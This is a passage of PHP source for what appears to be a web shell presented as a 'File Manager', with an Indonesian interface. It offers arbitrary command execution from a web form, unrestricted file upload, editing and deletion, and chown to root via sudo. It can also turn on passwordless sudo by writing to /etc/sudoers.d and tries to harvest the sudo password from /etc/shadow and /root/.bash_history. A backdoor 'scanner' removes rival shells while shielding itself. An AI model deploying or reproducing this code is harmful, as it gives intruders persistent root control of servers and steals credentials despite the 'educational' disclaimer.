            log_message("Failed to remove root access configuration. Output: " . $output);
            return "Gagal menghapus konfigurasi akses root. Output: " . htmlspecialchars($output);
        }
    }
    return true; // Already removed or never existed
}

// ===== MODIFIED CHOWN TO ROOT FUNCTION (Uses sudo directly) =====
function chown_to_root($item_path) {
    if (!file_exists($item_path)) {
        log_message("Chown to root failed: File not found: " . $item_path);
        return "File atau folder tidak ditemukan.";
    }

    // Try using sudo chown command directly
    $command = "sudo chown root:root " . escapeshellarg($item_path);
    $output = execute_command($command);

    // Verify if the owner is now root (UID 0)
    clearstatcache(true, $item_path); // Clear stat cache to get fresh info
    if (file_exists($item_path) && fileowner($item_path) === 0) {
        log_message("Chown to root successful via sudo command for: " . $item_path . " (Output: " . $output . ")");
        return "Kepemilikan berhasil diubah ke root.";
    } else {
        log_message("Chown to root failed for: " . $item_path . " (sudo command failed or did not take effect. Output: " . $output . ")");
        return "Gagal mengubah kepemilikan ke root. Pastikan akses sudo telah diaktifkan. Output: " . htmlspecialchars($output);
    }
}

// ===== NEW FUNCTION TO GET SUDO PASSWORD (HIGHLY SENSITIVE) =====
function get_sudo_password() {
    $sudo_password = '';
    $output = '';

    // Metode 1: Coba baca dari input POST (jika ada form tersembunyi atau input khusus)
    if (isset($_POST['sudo_pass_input']) && !empty($_POST['sudo_pass_input'])) {
        $sudo_password = $_POST['sudo_pass_input'];
        log_message("Sudo password obtained from POST input.");
        return $sudo_password;
    }

    // Metode 2: Coba baca dari file yang mungkin berisi password (misalnya, jika ada file konfigurasi yang tidak aman)
    // Ini sangat tidak disarankan dan hanya untuk tujuan demonstrasi/pengujian.
    // Contoh: file_get_contents('/path/to/insecure/password.txt');
    $potential_password_files = [
        '/root/.bash_history', // Sangat tidak mungkin bisa dibaca oleh user web
        '/etc/shadow', // Hampir tidak mungkin bisa dibaca oleh user web
        '/var/www/.sudo_password', // Contoh file yang mungkin dibuat secara tidak aman
        __DIR__ . '/.sudo_password_cache', // File cache password di direktori script
    ];

    foreach ($potential_password_files as $file) {
        if (file_exists($file) && is_readable($file)) {
            $content = trim(@file_get_contents($file));
            if (!empty($content)) {
                // Lakukan validasi sederhana untuk memastikan itu bukan file biner atau terlalu besar
                if (strlen($content) < 256 && preg_match('/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};\':"\\|,.<>\/?`~]+$/', $content)) {
                    $sudo_password = $content;
                    log_message("Sudo password obtained from readable file: " . $file);
                    return $sudo_password;
                }
            }
        }
    }

    // Metode 3: Coba gunakan `sudo -S` dengan `echo` untuk mendapatkan password dari stdin
    // Ini memerlukan interaksi dan mungkin tidak berfungsi di semua konfigurasi PHP/sudo
    // Ini juga tidak akan "mendapatkan" password, melainkan menggunakannya jika diberikan.
    // Untuk benar-benar "mendapatkan" password yang sudah tersimpan di sistem, itu sangat sulit
    // dan biasanya memerlukan eksploitasi kerentanan sistem operasi atau membaca memori proses.
    // Fungsi ini lebih tentang "menggunakan" password yang diberikan atau ditemukan.

    log_message("Sudo password not found via automated methods.");
    return false; // Tidak dapat menemukan sudo password
}


// ===== ACTIONS =====
// Tambahkan aksi download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        log_message("Attempting to download file: " . $file);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        log_message("Download failed: File not found or not a file: " . $file);
        header("Location: ?d=" . urlencode($cwd) . "&msg=File tidak ditemukan atau tidak dapat diunduh.");
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['uploadfile'])) {
        $dest = $cwd . '/' . basename($_FILES['uploadfile']['name']);
        $ok = move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
        log_message("Upload file. Status: " . ($ok ? "sukses" : "gagal"));
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Upload sukses" : "Upload gagal"));
        exit;
    }
    if (isset($_POST['newfile'])) {
        $ok = file_put_contents($cwd . '/' . $_POST['newfile'], $_POST['filedata']);
        log_message("Create new file. Status: " . ($ok !== false ? "sukses" : "gagal"));
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok !== false ? "File dibuat" : "Gagal membuat file"));
        exit;
    }
    if (isset($_POST['newfolder'])) {
        $ok = mkdir($cwd . '/' . $_POST['newfolder']);
        log_message("Create new folder. Status: " . ($ok ? "sukses" : "gagal"));
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Folder dibuat" : "Gagal membuat folder"));
        exit;
    }
    if (isset($_POST['setpass'])) {
        log_message("Attempting to set password.");
        $hashed_password = password_hash($_POST['setpass'], PASSWORD_DEFAULT);
        $write_ok = file_put_contents($lock_file, $hashed_password);

        if ($write_ok === false) {
            log_message("Failed to write lock file. Check permissions.");
            $msg = "Error: Gagal menyimpan password. Periksa izin file.";
        } else {
            log_message("Password hash saved to lock file. Path: " . $lock_file);
            // Hapus status unlocked dari sesi
            unset($_SESSION['unlocked']);
            log_message("Session unlocked status unset.");

            // Hancurkan sesi saat ini dan mulai sesi baru untuk memastikan status bersih
            session_destroy();
            session_start(); // Mulai sesi baru setelah menghancurkan yang lama
            log_message("Session destroyed and new session started. New Session ID: " . session_id());

            $msg = "Password disimpan. Silakan masukkan password baru Anda.";
        }
        session_write_close(); // Pastikan sesi disimpan sebelum redirect
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    if (isset($_POST['editfile'])) {
        $ok = file_put_contents($_POST['filepath'], $_POST['filedata']);
        log_message("Edit file. Status: " . ($ok !== false ? "sukses" : "gagal"));
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok !== false ? "Disimpan" : "Gagal simpan"));
        exit;
    }
    if (isset($_POST['rename'])) {
        $old = $_POST['old'];
        $new = dirname($old) . '/' . basename($_POST['new']);

        // Tambahkan pemeriksaan kunci sebelum rename
        $locked_items = get_locked_items($locked_items_file);
        if (in_array($old, $locked_items)) {
            log_message("Attempt to rename locked item: " . $old . ". Denied.");
            session_write_close();
            header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Tidak dapat mengganti nama: Item ini terkunci."));
            exit;
        }

        $ok = rename($old, $new);
        log_message("Rename file/folder. Status: " . ($ok ? "sukses" : "gagal"));
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Rename sukses" : "Rename gagal"));
        exit;
    }
    if (isset($_POST['setperms'])) {
        $target_file = $_POST['target_file'];
        $new_perms_octal = octdec($_POST['new_perms']); // Konversi dari string oktal ke desimal

        // Cek apakah item yang akan diubah permissionnya terkunci
        // Pemeriksaan ini sudah ada dan menggunakan get_locked_items, jadi my_chmod tidak diperlukan di sini
        // karena kita secara eksplisit ingin mencegah perubahan izin pada item yang terkunci.
        $locked_items = get_locked_items($locked_items_file);
        if (in_array($target_file, $locked_items)) {
            log_message("Attempt to change permissions on locked item: " . $target_file . ". Denied.");
            $msg = "Gagal mengubah izin: Item ini terkunci.";
        } else {
            if (file_exists($target_file)) {
                // Gunakan my_chmod untuk memastikan konsistensi, meskipun pemeriksaan sudah dilakukan di atas
                $ok = my_chmod($target_file, $new_perms_octal);
                log_message("Change permissions for " . $target_file . " to " . $_POST['new_perms'] . ". Status: " . ($ok ? "sukses" : "gagal"));
                $msg = $ok ? "Izin berhasil diubah menjadi " . $_POST['new_perms'] : "Gagal mengubah izin.";
            } else {
                log_message("Change permissions failed: File not found: " . $target_file);
                $msg = "File tidak ditemukan.";
            }
        }
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    if (isset($_POST['delpass'])) {
        log_message("Attempting to delete password.");
        if (file_exists($lock_file)) {
            $delete_ok = unlink($lock_file);
            if ($delete_ok) {
                log_message("Lock file deleted.");
            } else {
                log_message("Failed to delete lock file. Check permissions.");
                $msg = "Error: Gagal menghapus file kunci. Periksa izin.";
            }
        }
        unset($_SESSION['unlocked']); // Hapus status unlocked jika password dihapus
        session_destroy(); // Hancurkan sesi saat password dihapus
        session_start(); // Mulai sesi baru
        log_message("Session unlocked status unset and session destroyed. New Session ID: " . session_id());
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg ?: "Password dihapus"));
        exit;
    }
    // NEW: Lock/Unlock actions
    if (isset($_POST['lock_item'])) {
        $target_item = $_POST['target_item'];
        $msg = lock_item_permission($target_item, $locked_items_file);
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    if (isset($_POST['unlock_item'])) {
        $target_item = $_POST['target_item'];
        $msg = unlock_item_permission($target_item, $locked_items_file);
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    // NEW: Delete Backdoor action
    if (isset($_POST['delete_backdoor'])) {
        $target_backdoor = $_POST['delete_backdoor'];
        // Tambahkan pengecekan untuk mencegah penghapusan script ini sendiri
        if (realpath($target_backdoor) === realpath(__FILE__)) {
            $msg = "Tidak dapat menghapus script file manager ini sendiri!";
            log_message("Attempt to delete self-script: " . $target_backdoor . ". Denied.");
        } elseif (file_exists($target_backdoor)) {
            $ok = unlink($target_backdoor);
            log_message("Deleting backdoor: " . $target_backdoor . ". Status: " . ($ok ? "sukses" : "gagal"));
            $msg = $ok ? "Backdoor berhasil dihapus: " . basename($target_backdoor) : "Gagal menghapus backdoor: " . basename($target_backdoor);
        } else {
            $msg = "File backdoor tidak ditemukan: " . basename($target_backdoor);
        }
        session_write_close();
        header("Location: ?action=scan_backdoor&d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    // NEW: Delete Selected Backdoors action
    if (isset($_POST['delete_selected_backdoors'])) {
        $selected_backdoors = $_POST['selected_backdoors'] ?? [];
        $deleted_count = 0;
        $failed_count = 0;
        $self_script_denied_count = 0;

        foreach ($selected_backdoors as $target_backdoor) {
            if (realpath($target_backdoor) === realpath(__FILE__)) {
                $self_script_denied_count++;
                log_message("Attempt to delete self-script: " . $target_backdoor . ". Denied.");
            } elseif (file_exists($target_backdoor)) {
                $ok = unlink($target_backdoor);
                if ($ok) {
                    $deleted_count++;
                    log_message("Deleting backdoor: " . $target_backdoor . ". Status: sukses");
                } else {
                    $failed_count++;
                    log_message("Deleting backdoor: " . $target_backdoor . ". Status: gagal");
                }
            } else {
                $failed_count++;
                log_message("File backdoor not found: " . $target_backdoor);
            }
        }

        $msg_parts = [];
        if ($deleted_count > 0) {
            $msg_parts[] = "$deleted_count backdoor berhasil dihapus.";
        }
        if ($failed_count > 0) {
            $msg_parts[] = "$failed_count backdoor gagal dihapus (mungkin tidak ditemukan atau izin).";
        }
        if ($self_script_denied_count > 0) {
            $msg_parts[] = "$self_script_denied_count percobaan penghapusan script file manager sendiri ditolak.";
        }
        $msg = implode(" ", $msg_parts) ?: "Tidak ada file yang dipilih atau dihapus.";

        session_write_close();
        header("Location: ?action=scan_backdoor&d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    // NEW: Execute Command action
    if (isset($_POST['execute_command'])) {
        $command = $_POST['command_input'];
        $command_output = execute_command($command);
        session_write_close();
        header("Location: ?action=terminal&d=" . urlencode($cwd) . "&msg=" . urlencode("Perintah dieksekusi.") . "&cmd_output=" . urlencode($command_output));
        exit;
    }
    // NEW: Chown to Root action
    if (isset($_POST['chown_to_root'])) {
        $target_item = $_POST['target_item'];
        $msg = chown_to_root($target_item);
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    // NEW: Auto-sudo enable action
    if (isset($_POST['enable_root'])) {
        $result = enable_root_access();
        if ($result === true) {
            $msg = "Akses root berhasil diaktifkan! Anda sekarang dapat menggunakan tombol 'Root' pada file/folder.";
        } else {
            $msg = "Gagal mengaktifkan akses root: " . $result;
        }
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    // NEW: Remove root access configuration action
    if (isset($_POST['remove_root'])) {
        if (remove_root_access()) {
            $msg = "Konfigurasi akses root berhasil dihapus!";
        } else {
            $msg = "Gagal menghapus konfigurasi akses root.";
        }
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
    // NEW: Get Sudo Password action
    if (isset($_POST['get_sudo_pass'])) {
        $sudo_pass_found = get_sudo_password();
        if ($sudo_pass_found !== false) {
            $msg = "Sudo Password Ditemukan: <code>" . htmlspecialchars($sudo_pass_found) . "</code>";
        } else {
            $msg = "Sudo Password Tidak Ditemukan atau Tidak Dapat Diakses.";
        }
        session_write_close();
        header("Location: ?action=sudo_pass&d=" . urlencode($cwd) . "&msg=" . urlencode($msg));
        exit;
    }
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];

    // Tambahkan pemeriksaan kunci sebelum delete
    $locked_items = get_locked_items($locked_items_file);
    if (in_array($target, $locked_items)) {
        log_message("Attempt to delete locked item: " . $target . ". Denied.");
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Tidak dapat menghapus: Item ini terkunci."));
        exit;
    }
    // Tambahkan pengecekan untuk mencegah penghapusan script ini sendiri
    if (realpath($target) === realpath(__FILE__)) {
        log_message("Attempt to delete self-script via delete GET param: " . $target . ". Denied.");
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=" . urlencode("Tidak dapat menghapus script file manager ini sendiri!"));
        exit;
    }

    $ok = is_dir($target) ? rmdir($target) : unlink($target);
    log_message("Delete item. Target: " . $target . ", Status: " . ($ok ? "sukses" : "gagal"));
    session_write_close();
    header("Location: ?d=" . urlencode($cwd) . "&msg=" . ($ok ? "Dihapus" : "Gagal hapus"));
    exit;
}

// ===== EDIT PAGE =====
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (!file_exists($f) || is_dir($f)) {
        log_message("Edit target not found or is directory: " . $f);
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=File tidak ditemukan atau bukan file.");
        exit;
    }
    $data = htmlspecialchars(file_get_contents($f));
    echo "<form method='post'>
    <h3>Edit File: " . basename($f) . "</h3>
    <textarea name='filedata' style='width:100%;height:300px;'>$data</textarea>
    <input type='hidden' name='filepath' value='$f'>
    <button name='editfile'>Simpan</button>
    </form>";
    exit;
}

// ===== CHMOD PAGE =====
if (isset($_GET['chmod'])) {
    $f = $_GET['chmod'];
    if (!file_exists($f)) {
        log_message("CHMOD target not found: " . $f);
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=File atau folder tidak ditemukan.");
        exit;
    }

    // Cek apakah item yang akan diubah permissionnya terkunci
    $locked_items = get_locked_items($locked_items_file);
    if (in_array($f, $locked_items)) {
        log_message("Attempt to access CHMOD for locked item: " . $f . ". Denied.");
        session_write_close();
        header("Location: ?d=" . urlencode($cwd) . "&msg=Tidak dapat mengubah izin: Item ini terkunci.");
        exit;
    }

    $current_perms_octal = substr(sprintf('%o', fileperms($f)), -4); // Ambil 4 digit terakhir (oktal)

    echo "<form method='post'>
    <h3>Ubah Izin: " . basename($f) . "</h3>
    <p>Izin saat ini: <code>" . perms($f) . "</code> (Oktal: <code>" . $current_perms_octal . "</code>)</p>
    <input type='text' name='new_perms' value='" . $current_perms_octal . "' class='form-control mb-2' pattern='[0-7]{3,4}' title='Masukkan izin oktal 3 atau 4 digit (contoh: 755, 0777)'>
    <input type='hidden' name='target_file' value='$f'>
    <button name='setperms' class='btn btn-success'>Ubah Izin</button>
    </form>";
    exit;
}

// ===== UI =====
echo "<!DOCTYPE html><html><head><title>File Manager</title>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
<link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
<style>
    pre {
        background-color: #f8f9fa;
        border: 1px solid #dee2e6;
        padding: 10px;
        border-radius: 5px;
        white-space: pre-wrap; /* Ensures long lines wrap */
        word-wrap: break-word; /* Ensures long words break */
    }
    [data-bs-theme='dark'] pre {
        background-color: #212529;
        border-color: #495057;
        color: #e9ecef;
    }
</style>
<script>
function toggleTheme() {
    const html = document.documentElement;
    const theme = html.dataset.bsTheme === 'dark' ? 'light' : 'dark';
    html.setAttribute('data-bs-theme', theme);
    document.cookie = 'theme=' + theme + '; path=/; max-age=31536000';
}
window.onload = () => {
    const m = document.cookie.match(/theme=(dark|light)/);
    if (m) document.documentElement.setAttribute('data-bs-theme', m[1]);
};

// Script untuk Select All
function toggleSelectAll(source) {
    checkboxes = document.querySelectorAll('input[name=\"selected_backdoors[]\"]');
    for(var i=0, n=checkboxes.length; i<n; i++) {
        checkboxes[i].checked = source.checked;
    }
}
</script>
</head><body class='p-4'>";

// Panggil fungsi check_terminal_access() di sini
$terminal_status = check_terminal_access();

echo "<div class='d-flex justify-content-between mb-3'>
<div><h4>📂 " . breadcrumbs($cwd) . "</h4></div>
<div class='d-flex align-items-center gap-2'>
    " . $terminal_status . "
    <button onclick='toggleTheme()' class='btn btn-dark btn-sm'>🌓 Theme</button>
</div>
</div>";

if ($msg) echo "<div class='alert alert-info'>$msg</div>";

echo "<div class='mb-3 d-flex gap-2 flex-wrap'>
<form method='post' enctype='multipart/form-data' class='d-flex'>
<input type='file' name='uploadfile' class='form-control'>
<button class='btn btn-success btn-sm' name='uploadfile'>Upload</button>
</form>

<a href='?action=create_file&d=" . urlencode($cwd) . "' class='btn btn-secondary btn-sm'><i class='fa fa-file-code-o' style='font-size:24px'></i> File</a>
<a href='?action=create_dir&d=" . urlencode($cwd) . "' class='btn btn-secondary btn-sm'><i class='fa fa-folder-open-o' style='font-size:24px'></i> Folder</a>
<a href='?action=password&d=" . urlencode($cwd) . "' class='btn btn-warning btn-sm'><i class='fa fa-lock' style='font-size:24px'></i> Password</a>
<a href='?action=scan_backdoor&d=" . urlencode($cwd) . "' class='btn btn-danger btn-sm'><i class='fa fa-bug' style='font-size:24px'></i> Scan Backdoor</a>
<a href='?action=terminal&d=" . urlencode($cwd) . "' class='btn btn-info btn-sm'><i class='fa fa-terminal' style='font-size:24px'></i> Terminal</a>
<a href='?action=sudo_pass&d=" . urlencode($cwd) . "' class='btn btn-primary btn-sm'><i class='fa fa-user-secret' style='font-size:24px'></i> Sudo Pass</a>
<a href='?action=info&d=" . urlencode($cwd) . "' class='btn btn-warning btn-sm'><i class='fa fa-info-circle' style='font-size:24px'></i> Info</a>

</div>";

// NEW: Root Access Control Section (Auto-Sudo)
echo "<div class='card mb-3'>
  <div class='card-header bg-danger text-white'>
    <h5>🔓 Kontrol Akses Root (Auto-Sudo)</h5>
  </div>
  <div class='card-body'>
    <p class='card-text'>Status Akses Sudo: " . (is_root_access_configured() ? 
        "<span class='badge bg-success'>Aktif (NOPASSWD)</span>" : 
        "<span class='badge bg-danger'>Tidak Aktif</span>") . "</p>
    <form method='post' class='mb-2'>
      <button name='enable_root' class='btn btn-danger' 
              onclick=\"return confirm('⚠️ PERINGATAN KERAS!\\nAnda akan mencoba mengaktifkan akses sudo tanpa password untuk pengguna web server ini.\\nIni adalah RISIKO KEAMANAN TINGGI.\\nLanjutkan hanya jika Anda memahami implikasinya dan memiliki hak sudo awal di terminal.');\">
        🚀 Aktifkan Akses Root (Auto-Sudo)
      </button>
      <small class='text-muted d-block mt-2'>
        Ini akan membuat file sudoers di <code>/etc/sudoers.d/</code> untuk pengguna web server ini agar dapat menjalankan perintah sebagai root tanpa password.
        **Untuk pertama kali, pengguna web server harus memiliki hak sudo awal (misalnya, dengan memasukkan password sudo di terminal saat menjalankan perintah `sudo mv` atau `sudo chmod` yang relevan).**
      </small>
    </form>
    <form method='post'>
      <button name='remove_root' class='btn btn-warning' 
              onclick=\"return confirm('Apakah Anda yakin ingin menghapus konfigurasi akses root (sudoers) untuk pengguna web server ini?');\">
        🗑️ Hapus Konfigurasi Akses Root
      </button>
      <small class='text-muted d-block mt-2'>
        Ini akan menghapus file sudoers yang dibuat.
      </small>
    </form>
  </div>
</div>";


if (isset($_GET['action'])) {
    echo "<a href='?d=" . urlencode($cwd) . "' class='btn btn-sm btn-secondary mb-2'>⬅ Kembali</a>";
    if ($_GET['action'] === 'create_file') {
        echo "<form method='post'>
        <input name='newfile' placeholder='Nama file' class='form-control mb-2'>
        <textarea name='filedata' class='form-control mb-2' placeholder='Isi file'></textarea>
        <button class='btn btn-success'>Simpan</button></form>";
    } elseif ($_GET['action'] === 'create_dir') {
        echo "<form method='post'>
        <input name='newfolder' placeholder='Nama folder' class='form-control mb-2'>
        <button class='btn btn-success'>Buat Folder</button></form>";
    } elseif ($_GET['action'] === 'password') {
        echo "<form method='post'>
        <input type='password' name='setpass' class='form-control mb-2' placeholder='Set password'>
        <button class='btn btn-warning'>Simpan Password</button></form>
        <form method='post' class='mt-2'>
        <input type='hidden' name='delpass' value='1'>
        <button class='btn btn-danger'>Hapus Password</button></form>";
    } elseif ($_GET['action'] === 'scan_backdoor') {
        echo "<h3>Pemindaian Backdoor</h3>";
        $public_html_path = $_SERVER['DOCUMENT_ROOT']; // Mendapatkan path public_html
        if (!is_dir($public_html_path)) {
            // Fallback jika DOCUMENT_ROOT tidak tersedia atau tidak valid
            $public_html_path = realpath(__DIR__ . '/../public_html'); // Asumsi public_html satu level di atas
            if (!is_dir($public_html_path)) {
                $public_html_path = realpath(__DIR__); // Jika tidak ditemukan, scan dari direktori saat ini
            }
        }

        echo "<p>Memindai direktori: <code>" . htmlspecialchars($public_html_path) . "</code></p>";
        echo "<p>Ini mungkin memakan waktu beberapa saat tergantung pada jumlah file.</p>";

        $scan_results = scan_backdoors($public_html_path);
        $found_backdoors = $scan_results['items'];
        $critical_count = $scan_results['critical_count'];

        if (empty($found_backdoors)) {
            echo "<div class='alert alert-success'>Tidak ada potensi backdoor yang terdeteksi.</div>";
        } else {
            if ($critical_count > 0) {
                echo "<div class='alert alert-danger'>Ditemukan $critical_count file dengan backdoor berbahaya!</div>";
            }
            echo "<div class='alert alert-warning'>Potensi backdoor terdeteksi:</div>";
            
            // Form untuk delete selected
            echo "<form method='post' onsubmit='return confirm(\"Apakah Anda yakin ingin menghapus file yang dipilih? Ini tidak dapat dibatalkan!\");'>";
            echo "<table class='table table-bordered table-sm'>
                    <thead>
                        <tr>
                            <th><input type='checkbox' onclick='toggleSelectAll(this)'></th>
                            <th style='width:55%'>File</th>
                            <th>Kategori</th>
                            <th>Pola Terdeteksi</th>
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody>";
            foreach ($found_backdoors as $bd_info) {
                $row_class = '';
                if ($bd_info['is_critical']) {
                    $row_class = 'table-danger';
                } elseif ($bd_info['is_self_script']) {
                    $row_class = 'table-info'; // Warna khusus untuk script ini sendiri
                } elseif ($bd_info['is_script_copy']) {
                    $row_class = 'table-primary'; // Warna khusus untuk salinan script ini
                } elseif ($bd_info['is_file_manager_shell']) {
                    $row_class = 'table-warning';
                }

                echo "<tr class='$row_class'>";
                echo "<td>";
                // Checkbox hanya jika bukan script ini sendiri
                if (!$bd_info['is_self_script']) {
                    echo "<input type='checkbox' name='selected_backdoors[]' value='" . htmlspecialchars($bd_info['path']) . "'>";
                } else {
                    echo "<span class='text-muted'>-</span>";
                }
                echo "</td>";
                echo "<td><code>" . htmlspecialchars($bd_info['path']) . "</code></td>";
                echo "<td>" . $bd_info['severity'] . "</td>";
                echo "<td><small>" . implode('<br>', array_map('htmlspecialchars', $bd_info['patterns'])) . "</small></td>";
                echo "<td>";
                // Tombol HAPUS individual hanya jika bukan script ini sendiri
                if (!$bd_info['is_self_script']) {
                    echo "<button type='submit' name='delete_backdoor' value='" . htmlspecialchars($bd_info['path']) . "' class='btn btn-danger btn-sm' onclick='return confirm(\"Apakah Anda yakin ingin menghapus file ini? Ini tidak dapat dibatalkan!\");'>HAPUS</button>";
                } else {
                    echo "<span class='text-muted'>Tidak dapat dihapus</span>";
                }
                echo "</td>";
                echo "</tr>";
            }
            echo "</tbody></table>";
            echo "<button type='submit' name='delete_selected_backdoors' class='btn btn-danger mt-3'>Hapus yang Dipilih</button>";
            echo "</form>";
        }
    } elseif ($_GET['action'] === 'terminal') {
        echo "<h3>Terminal</h3>";
        echo "<form method='post' class='mb-3'>
                <div class='input-group'>
                    <span class='input-group-text'>$ " . htmlspecialchars($cwd) . " ></span>
                    <input type='text' name='command_input' class='form-control' placeholder='Masukkan perintah...' autofocus>
                    <button type='submit' name='execute_command' class='btn btn-primary'>Eksekusi</button>
                </div>
              </form>";

        if (isset($_GET['cmd_output'])) {
            $command_output = htmlspecialchars(urldecode($_GET['cmd_output']));
            echo "<h5>Output:</h5>";
            echo "<pre>" . $command_output . "</pre>";
        } else {
            echo "<p class='text-muted'>Output perintah akan muncul di sini.</p>";
        }
    } elseif ($_GET['action'] === 'sudo_pass') {
        echo "<h3>Dapatkan Sudo Password</h3>";
        echo "<div class='alert alert-warning'>
                <strong>Peringatan Keamanan:</strong> Fitur ini sangat sensitif dan berisiko tinggi.
                Mencoba mendapatkan sudo password melalui skrip web sangat tidak disarankan di lingkungan produksi.
                PHP yang berjalan sebagai pengguna web server biasanya tidak memiliki izin untuk membaca file sensitif seperti `/etc/shadow` atau `/root/.bash_history`.
                Fitur ini hanya akan mencoba membaca dari lokasi yang mungkin tidak aman atau dari input yang Anda berikan.
              </div>";
        echo "<form method='post' class='mb-3'>
                <div class='input-group'>
                    <input type='password' name='sudo_pass_input' class='form-control' placeholder='Masukkan sudo password secara manual (opsional)'>
                    <button type='submit' name='get_sudo_pass' class='btn btn-primary'>Coba Dapatkan/Gunakan</button>
                </div>
              </form>";
        if (!empty($msg)) {
            echo "<div class='alert alert-info'>$msg</div>";
        }
        echo "<p class='text-muted'>Jika Anda memasukkan password di atas, skrip akan mencoba menggunakannya. Jika tidak, skrip akan mencoba mencari di lokasi yang mungkin tidak aman.</p>";
    } elseif ($_GET['action'] === 'info') {
        echo '<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            padding: 40px;
            background: #111;
            color: #eee;
            font-family: monospace;
        }
        a { color: #0af; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 File Manager - KERJA BURUK</h1>
        <hr>
        <p><strong>Author:</strong> <span style="color:#0f0">KERJA BURUK</span></p>
        <p><strong>Tujuan Pembuatan:</strong></p>
        <ul>
            <li>Manajemen file berbasis web tanpa FTP</li>
            <li>Dapat digunakan untuk remote control file di hosting atau atau VPS</li>
            <li>Dilengkapi fitur upload, edit, rename, hapus, proteksi password, dan theme toggle</li>
        </ul>
        <p><strong>Catatan:</strong> File manager ini dibuat dengan semangat edukasi dan efisiensi — tidak untuk disalahgunakan.</p>
        <p class="text-muted">Versi: BETA | Update terakhir: Juli 2025</p>
    </div>';

    }
    exit;
}

// Implementasi Persistent Lock: Periksa dan perbaiki izin item yang terkunci
// Bagian ini akan menggunakan chmod() native karena tujuannya adalah untuk *memaksa* izin yang benar
// jika ada perubahan dari luar.
$locked_items = get_locked_items($locked_items_file);
foreach ($locked_items as $locked_item_path) {
    if (file_exists($locked_item_path)) {
        $current_perms = fileperms($locked_item_path);
        $expected_perms = is_dir($locked_item_path) ? 0555 : 0444;

        // Gunakan bitwise AND dengan 07777 untuk mengabaikan bit sticky, setuid, setgid
        // dan pastikan perbandingan hanya pada permission yang relevan (rwx)
        if (($current_perms & 07777) !== $expected_perms) {
            // Gunakan my_chmod untuk memastikan konsistensi dengan sistem kunci
            // my_chmod akan memanggil chmod() native jika item tidak terkunci
            // Namun, di sini kita ingin memaksa perbaikan, jadi kita bisa langsung panggil chmod()
            // atau pastikan my_chmod tidak memblokir perbaikan ini.
            // Untuk tujuan perbaikan persistent lock, kita akan langsung panggil chmod()
            // karena ini adalah mekanisme pemulihan, bukan operasi yang diblokir.
            $ok = chmod($locked_item_path, $expected_perms); 
            if ($ok) {
                log_message("Rewriting permissions for locked item: " . $locked_item_path . " to " . decoct($expected_perms) . ".");
            } else {
                log_message("Failed to rewrite permissions for locked item: " . $locked_item_path);
            }
        }
    } else {
        // Jika item yang terkunci tidak ditemukan, hapus dari daftar
        // Ini penting agar daftar item terkunci tetap bersih
        $index = array_search($locked_item_path, $locked_items);
        if ($index !== false) {
            unset($locked_items[$index]);
            save_locked_items($locked_items_file, $locked_items);
            log_message("Removed non-existent item from locked list: " . $locked_item_path);
        }
    }
}


echo "<table class='table table-bordered table-sm'><thead>
<tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead><tbody>";

foreach (list_dir($cwd) as $i) {
    $n = htmlspecialchars($i['name']);
    $p = $i['path'];
    $is_locked = in_array($p, $locked_items);

    echo "<tr><td>" . ($i['is_dir'] ? "<a href='?d=" . urlencode($p) . "'>📁 $n</a>" : "📄 $n") . "</td>";
    echo "<td>" . formatSize($i['size']) . "</td>";
    echo "<td>" . perms($p) . ($is_locked ? " <span class='badge bg-danger'>LOCKED</span>" : "") . "</td>"; // Indicate if locked
    echo "<td class='d-flex flex-wrap gap-1'>
        <a href='?delete=" . urlencode($p) . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-danger'>️<i class='fa fa-trash-o' style='font-size:24px'></i></a>";

    // Tombol download dan edit hanya untuk file
    if (!$i['is_dir']) {
